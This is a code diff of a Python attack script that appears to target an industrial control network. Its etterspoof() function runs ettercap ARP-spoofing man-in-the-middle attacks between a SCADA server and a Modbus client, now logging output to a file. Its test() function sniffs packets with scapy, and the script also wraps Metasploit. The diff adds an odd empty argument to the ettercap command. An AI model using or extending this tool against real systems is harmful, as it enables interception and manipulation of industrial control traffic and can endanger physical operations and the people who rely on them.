@@ -64,20 +64,18 @@ def etterspoof():
     
     if subprocess.getoutput("pgrep -x ettercap") == "":
         intrfce = input("Enter Interface Name (e.g., eth1): ") 
-        
+        log_file = open("/var/log/ettercap.log", "a")
         cmd = [
-            "ettercap", "-TqD", "-i", intrfce, 
-            "-M", "arp:remote", 
-            f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"
+            "ettercap", "-T", "-i", intrfce, "-M", "arp:remote", f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//", ""
         ]
         
         print(f"Executing: {' '.join(cmd)}")
         
         subprocess.Popen(
             cmd, 
-            stdout=subprocess.DEVNULL, 
-            stderr=subprocess.DEVNULL, 
-            stdin=subprocess.DEVNULL, 
+            stdout=log_file,
+            stderr=subprocess.STDOUT,
+            stdin=subprocess.DEVNULL,
             start_new_session=True
         )
         
@@ -151,13 +149,12 @@ def traffic():
         return
 
 def test():
+    intrfce = input("Enter Interface to sniff (e.g., eth1): ")
     try:
-        sniff(store=0, prn=lambda x: x.summary())
+        sniff(iface=intrfce, store=0, prn=lambda x: x.summary(), timeout=10)
         return
-    except KeyboardInterrupt:
-        print("Exiting...")
-        time.sleep(0.5)
-        return
+    except Exception as e:
+        print(f"Error: {e}")
 
 def msfconsole():
     try:
